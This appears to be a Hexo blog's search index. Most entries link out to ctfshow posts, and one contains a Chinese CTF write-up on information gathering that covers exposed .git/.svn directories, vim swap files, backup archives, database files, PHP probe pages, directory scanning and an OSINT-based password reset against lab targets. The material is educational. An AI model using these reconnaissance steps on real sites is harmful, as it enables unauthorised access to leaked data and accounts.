    <content type="html"><![CDATA[<p><a href="http://118.178.126.49/blogs/CTF_show_Web%E5%85%A5%E9%97%A8_sql%E6%B3%A8%E5%85%A5.html">http://118.178.126.49/blogs/CTF_show_Web入门_sql注入.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Web入门_php特性</title>
    <link href="/2022/07/16/CTF_show_Web%E5%85%A5%E9%97%A8_php%E7%89%B9%E6%80%A7/"/>
    <url>/2022/07/16/CTF_show_Web%E5%85%A5%E9%97%A8_php%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<p><a href="http://118.178.126.49/blogs/CTF_show_Web%E5%85%A5%E9%97%A8_php%E7%89%B9%E6%80%A7.html">http://118.178.126.49/blogs/CTF_show_Web入门_php特性.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Web入门_文件包含</title>
    <link href="/2022/07/13/CTF_show_Web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2022/07/13/CTF_show_Web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<p><a href="http://118.178.126.49/blogs/CTF_show_Web%E5%85%A5%E9%97%A8_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.html">http://118.178.126.49/blogs/CTF_show_Web入门_文件包含.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Web入门_命令执行</title>
    <link href="/2022/07/12/CTF_show_Web%E5%85%A5%E9%97%A8_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2022/07/12/CTF_show_Web%E5%85%A5%E9%97%A8_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<p><a href="http://118.178.126.49/blogs/CTF_show_Web%E5%85%A5%E9%97%A8_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.html">http://118.178.126.49/blogs/CTF_show_Web入门_命令执行.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Web入门_爆破</title>
    <link href="/2022/07/11/CTF_show_Web%E5%85%A5%E9%97%A8_%E7%88%86%E7%A0%B4/"/>
    <url>/2022/07/11/CTF_show_Web%E5%85%A5%E9%97%A8_%E7%88%86%E7%A0%B4/</url>
    
    <content type="html"><![CDATA[<p><a href="http://118.178.126.49/blogs/CTF_show_Web%E5%85%A5%E9%97%A8_%E7%88%86%E7%A0%B4.html">http://118.178.126.49/blogs/CTF_show_Web入门_爆破.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF_show_Web入门_信息搜集</title>
    <link href="/2022/07/10/CTF-show-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <url>/2022/07/10/CTF-show-Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="CTFshow-WriteUps"><a href="#CTFshow-WriteUps" class="headerlink" title="CTFshow WriteUps"></a>CTFshow WriteUps</h1><hr><h2 id="WEB入门"><a href="#WEB入门" class="headerlink" title="WEB入门"></a>WEB入门</h2><hr><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><ul><li>查看源代码直接找到</li></ul><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><ul><li>火狐浏览器网址上输入config：about后打开设置禁止js（绕过js前端验证）</li><li>查看源码</li></ul><h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><ul><li>bp抓包</li><li>把GET改成POST</li><li>Repeat了一下就出来flag了</li></ul><h3 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h3><ul><li>根据提示看一下robots协议</li><li>看到flagishere.txt访问一下</li><li>出flag</li></ul><h3 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h3><ul><li>访问index.phps后下载文件打开即得flag</li></ul><h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><ul><li>使用diesearch扫出<a href="http://www.zip/">www.zip</a></li><li>访问下载得到flag</li></ul><h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><ul><li>提示：版本控制很重要</li><li>联想：用什么控制版本？git！</li><li>访问 <em><strong>.git&#x2F;</strong></em> 得flag</li></ul><h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><ul><li>提示：版本控制很重要（怎么又是这个？）</li><li>联想：除了git还有什么可以控制版本？svn!</li><li>访问 ***.svn&#x2F;***得flag</li></ul><h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><ul><li>提示：发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</li><li>联想：vim死机？这不留下vim缓存<ul><li><strong>知识点</strong>：vim 交换文件名<br>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容<br>以 index.php 为例：第一次产生的交换文件名为 .index.php.swp<br>再次意外退出后，将会产生名为 .index.php.swo 的交换文件<br>第三次产生的交换文件则为 .index.php.swn</li></ul></li><li>此题访问.index.php.swp下载打开得flag</li></ul><h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><ul><li>看cookie</li></ul><h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><ul><li><a href="https://zijian.aliyun.com上查一下flag.ctfshow.com/">https://zijian.aliyun.com上查一下flag.ctfshow.com</a></li></ul><h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><ul><li>提示：有时候网站上的公开信息，就是管理员常用密码</li><li>打开网址（太酷炫，按了5min啥结果没有）</li><li>思考：在哪登陆？试一下login没有 再思考 试一下admin发现找到登陆口</li><li>思考：密码在哪？</li><li>思考提示：最下面找到个数字尝试一下，flag！</li></ul><h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h3><ul><li><p>提示：技术文档中不要出现敏感信息，部署到生产环境后及时修改默认密码</p></li><li><p>打开链接，开始闲逛，翻到最底下，技术文档，技术文档，技术文档。。。document？！点开</p></li><li><p>easy</p></li><li><p>点了一下链接，进不去？？？！</p></li><li><p><img src="https://img-blog.csdnimg.cn/8983f88e7e264e92bd52ba5ad94c45e5.png#pic_center" alt="在这里插入图片描述"></p></li><li><p>再看看链接。。。 <strong>your-domain</strong></p></li><li><p>学过英语 dddd</p></li><li><p>拿下</p></li></ul><h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><ul><li><p>提示：有时候源码里面就不经意间泄漏重要信息（editor）的信息，默认配置害死人</p></li><li><p>dirsearch一下发现&#x2F;editor</p></li><li><p>果断访问一下</p></li><li><p><img src="https://img-blog.csdnimg.cn/42ede35c3e304845887c7801a102507f.png#pic_center" alt="在这里插入图片描述"></p></li><li><p>懵逼1s</p></li><li><p>点提交404（cao，怎么是404）。。。再想想</p></li><li><p>上传图片打开</p></li><li><p><img src="https://img-blog.csdnimg.cn/875fc3b0c3104b95bcafc5c20d718436.png#pic_center" alt="在这里插入图片描述"></p></li><li><p>感觉没什么用啊，崩溃ing</p></li><li><p>随便点一下<strong>图片空间</strong> 哎嗨</p></li><li><p><img src="https://img-blog.csdnimg.cn/57a646bf776f4c17a3af3cd2052aa94f.png#pic_center" alt="在这里插入图片描述"></p></li><li><p>这不就是linux服务器的文件形式吗？想起提示<strong>默认地址</strong></p></li><li><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;nothinghere&#x2F;fl000g.txt</p></li><li><p>找到地址访问得flag！！！</p></li></ul><h3 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h3><ul><li>提示：公开的信息比如邮箱，可能造成信息泄漏，产生严重后果</li><li>打开网页在下面找到一个qq邮箱</li><li>试一下访问&#x2F;admin</li><li>需要密码</li><li>忘记密码</li><li>提示需要问答验证（需要地址）</li><li>qq搜索改qq号发现地址为西安</li><li>输入后重置密码登录获取flag</li></ul><h3 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h3><ul><li><p>看了别人的WP</p></li><li><p><strong>知识点</strong>（查阅可知）：php探针：用来检测空间、服务器运行状况和PHP信息等</p></li><li><p>&#x2F;tz.php访问雅黑PHP探针</p></li><li><p>点击phpinfo</p></li><li><p>ctrl+F搜索ctfshow找到flag</p></li><li><p>长见识了捏</p></li></ul><h3 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h3><ul><li>提示：备份的sql文件会泄漏敏感信息</li><li>dirsearch搜了一遍找不到</li><li>看了wp</li><li>原来是backup.sql</li><li>长点见识</li></ul><h3 id="Web18"><a href="#Web18" class="headerlink" title="Web18"></a>Web18</h3><ul><li><p>打开链接：小鸟游戏（🤯好难，101这是人能到的分数？）</p></li><li><p>估摸是js写的小游戏</p></li><li><p>查看源代码</p></li><li><p><img src="https://img-blog.csdnimg.cn/abb13751e7084b9890488709af0d6c66.png#pic_center" alt="在这里插入图片描述"></p></li><li><p>score&gt;100?嗯？这不是我心心念念的101吗</p></li><li><p><img src="https://img-blog.csdnimg.cn/b1109420a39e443db3a875347249d708.png#pic_center" alt="在这里插入图片描述"></p></li><li><p>编码一下</p></li><li><p>访问110.php</p></li><li><p>flag</p></li></ul><h3 id="Web19"><a href="#Web19" class="headerlink" title="Web19"></a>Web19</h3><ul><li>查看源代码js部分看到username和pazzword</li><li>我这里直接输入框里输过不去</li><li>抓了个包</li><li>得到flag</li></ul><h3 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h3><ul><li>提示：mdb文件是早期asp+access架构的数据库文件，文件泄漏相当于数据库被脱裤了</li><li>盲区 看wp</li><li>访问&#x2F;db&#x2F;db.mdb</li><li>下载文件记事本打开得flag</li></ul>]]></content>
    
    
    <categories>
      
      <category>ctfshow</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/07/10/hello-world/"/>
    <url>/2022/07/10/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="code-wrapper"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span></code></pre></div><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="code-wrapper"><pre><code class="hljs bash">$ hexo server</code></pre></div><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="code-wrapper"><pre><code class="hljs bash">$ hexo generate</code></pre></div><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="code-wrapper"><pre><code class="hljs bash">$ hexo deploy</code></pre></div><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
